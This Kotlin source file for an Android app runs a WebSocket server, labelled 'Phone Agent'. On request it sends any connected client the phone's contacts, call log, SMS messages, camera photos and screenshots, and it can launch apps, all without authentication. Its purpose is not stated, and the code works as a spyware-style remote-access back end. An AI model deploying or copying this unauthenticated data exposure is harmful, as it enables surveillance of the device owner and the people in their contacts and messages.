package com.example.agentapp

import android.content.Context
import android.content.Intent
import org.java_websocket.WebSocket
import org.java_websocket.handshake.ClientHandshake
import org.java_websocket.server.WebSocketServer
import org.json.JSONObject
import java.net.InetSocketAddress

class AgentWebSocketServer(
    port: Int,
    private val collector: DataCollector,
    private val context: Context
) : WebSocketServer(InetSocketAddress(port)) {

    private val connectedClients = mutableSetOf<WebSocket>()

    override fun onOpen(conn: WebSocket, handshake: ClientHandshake) {
        connectedClients.add(conn)
        conn.send("""{"type":"welcome","message":"Connected to Phone Agent"}""")
        android.util.Log.d("AgentWS", "Client connected: ${conn.remoteSocketAddress}")
    }

    override fun onClose(conn: WebSocket, code: Int, reason: String, remote: Boolean) {
        connectedClients.remove(conn)
        android.util.Log.d("AgentWS", "Client disconnected")
    }

    override fun onMessage(conn: WebSocket, message: String) {
        android.util.Log.d("AgentWS", "Command received: $message")
        try {
            val cmd = JSONObject(message)
            handleCommand(conn, cmd)
        } catch (e: Exception) {
            conn.send("""{"type":"error","message":"Invalid JSON: ${e.message}"}""")
        }
    }

    private fun handleCommand(conn: WebSocket, cmd: JSONObject) {
        when (cmd.optString("action")) {

            "ping" -> conn.send("""{"type":"pong"}""")

            "get_contacts" -> {
                Thread {
                    try {
                        val data = collector.getContacts()
                        conn.send(JSONObject().apply {
                            put("type", "contacts")
                            put("data", data)
                            put("count", data.length())
                        }.toString())
                    } catch (e: Exception) {
                        conn.send(error("contacts", e.message))
                    }
                }.start()
            }

            "get_calls" -> {
                val limit = cmd.optInt("limit", 50)
                Thread {
                    try {
                        val data = collector.getCallLog(limit)
                        conn.send(JSONObject().apply {
                            put("type", "calls")
                            put("data", data)
                            put("count", data.length())
                        }.toString())
                    } catch (e: Exception) {
                        conn.send(error("calls", e.message))
                    }
                }.start()
            }

            "get_sms" -> {
                val limit = cmd.optInt("limit", 50)
                Thread {
                    try {
                        val data = collector.getSMS(limit)
                        conn.send(JSONObject().apply {
                            put("type", "sms")
                            put("data", data)
                            put("count", data.length())
                        }.toString())
                    } catch (e: Exception) {
                        conn.send(error("sms", e.message))
                    }
                }.start()
            }

            "take_photo" -> {
                try {
                    val intent = Intent(context, ScreenCaptureActivity::class.java).apply {
                        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                        putExtra("mode", "camera")
                    }
                    context.startActivity(intent)
                    conn.send("""{"type":"status","message":"Camera opening, call get_photo in 3 seconds..."}""")
                } catch (e: Exception) {
                    conn.send(error("camera", e.message))
                }
            }

            "get_photo" -> {
                Thread {
                    try {
                        val b64 = collector.getLastPhoto()
                        if (b64 != null) {
                            conn.send(JSONObject().apply {
                                put("type", "photo")
                                put("data", b64)
                            }.toString())
                        } else {
                            conn.send("""{"type":"status","message":"No photo yet. Call take_photo first."}""")
                        }
                    } catch (e: Exception) {
                        conn.send(error("photo", e.message))
                    }
                }.start()
            }

            "capture_screen" -> {
                try {
                    val intent = Intent(context, ScreenCaptureActivity::class.java).apply {
                        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                        putExtra("mode", "screen")
                    }
                    context.startActivity(intent)
                    conn.send("""{"type":"status","message":"Screen capture requested. Call get_screen in 3 seconds..."}""")
                } catch (e: Exception) {
                    conn.send(error("screen", e.message))
                }
            }

            "get_screen" -> {
                Thread {
                    try {
                        val b64 = collector.getLastScreen()
                        if (b64 != null) {
                            conn.send(JSONObject().apply {
                                put("type", "screen")
                                put("data", b64)
                            }.toString())
                        } else {
                            conn.send("""{"type":"status","message":"No screenshot yet. Call capture_screen first."}""")
                        }
                    } catch (e: Exception) {
                        conn.send(error("screen", e.message))
                    }
                }.start()
            }

            "get_device_info" -> {
                conn.send(JSONObject().apply {
                    put("type", "device_info")
                    put("manufacturer", android.os.Build.MANUFACTURER)
                    put("model", android.os.Build.MODEL)
                    put("android_version", android.os.Build.VERSION.RELEASE)
                    put("sdk", android.os.Build.VERSION.SDK_INT)
                    put("uptime_ms", android.os.SystemClock.elapsedRealtime())
                }.toString())
            }

            "launch_app" -> {
                val packageName = cmd.optString("package", "")
                if (packageName.isNotEmpty()) {
                    try {
                        val launchIntent = context.packageManager.getLaunchIntentForPackage(packageName)
                        if (launchIntent != null) {
                            launchIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                            context.startActivity(launchIntent)
                            conn.send("""{"type":"status","message":"Launched $packageName"}""")
                        } else {
                            conn.send("""{"type":"error","message":"App not found: $packageName"}""")
                        }
                    } catch (e: Exception) {
                        conn.send(error("launch_app", e.message))
                    }
                } else {
                    conn.send("""{"type":"error","message":"Provide package name"}""")
                }
            }

            "list_apps" -> {
                Thread {
                    try {
                        val apps = collector.getInstalledApps()
                        conn.send(JSONObject().apply {
                            put("type", "apps")
                            put("data", apps)
                            put("count", apps.length())
                        }.toString())
                    } catch (e: Exception) {
                        conn.send(error("apps", e.message))
                    }
                }.start()
            }

            else -> conn.send("""{"type":"error","message":"Unknown action: ${cmd.optString("action")}"}""")
        }
    }

    fun broadcastToAll(json: String) {
        connectedClients.forEach { client ->
            if (client.isOpen) client.send(json)
        }
    }

    private fun error(context: String, msg: String?) =
        """{"type":"error","context":"$context","message":"${msg ?: "Unknown error"}"}"""

    override fun onError(conn: WebSocket?, ex: Exception) {
        android.util.Log.e("AgentWS", "WebSocket error: ${ex.message}")
    }

    override fun onStart() {
        android.util.Log.d("AgentWS", "WebSocket server started on port $port")
    }
}
